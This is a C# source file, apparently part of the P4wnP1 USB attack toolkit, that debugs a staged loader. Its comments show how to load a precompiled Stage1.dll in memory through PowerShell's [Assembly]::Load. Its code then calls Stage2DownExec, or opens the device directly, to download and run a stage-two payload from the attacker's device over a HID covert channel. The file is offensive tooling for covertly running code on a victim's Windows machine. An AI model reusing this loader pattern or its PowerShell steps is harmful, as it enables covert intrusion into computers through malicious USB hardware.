namespace LoaderApp
{
    class Program
    {
        static void Main(string[] args)
        {
            /*
             * This code mimics the behavior of stage1, which has to be reimplemented in Powershell
             * This could be achieved if precompiled Stage1.dll is loaded into a PowerShell byte[]
             * If the byte[] containing stage 1 is called $stage1, execution of stage2 could be achieved like this:
             * 
             *      PS> [Assembly]::Load($stage1)
             *      PS> [Stage1.Device]::Stage2DownExec("deadbeefdeadbeef", "MaMe82")
             * after compiling Stage1.dll
             */

            const bool RUN_STAGE2_LOCAL_DEBUG = true;

            if (!RUN_STAGE2_LOCAL_DEBUG)
            {
                /*
                * Download and invoke stage2 from P4wnP1 via HID covert channel (has to be replicated in PowerShell)
                */
                Stage1.Device.Stage2DownExec("deadbeefdeadbeef", "MaMe82");
            }
            else
            {
                /*
                * Manual start of stage2 for debugging
                * Don't forget to upload newly compiled P4wnP1.dll (=stage2) to P4wnP1 after making changes
                */
                System.IO.FileStream dev = Stage1.Device.Open("deadbeefdeadbeef", "MaMe82"); //
                P4wnP1.Runner.run(dev, dev);
            }

            

            

    
        }
    }
}
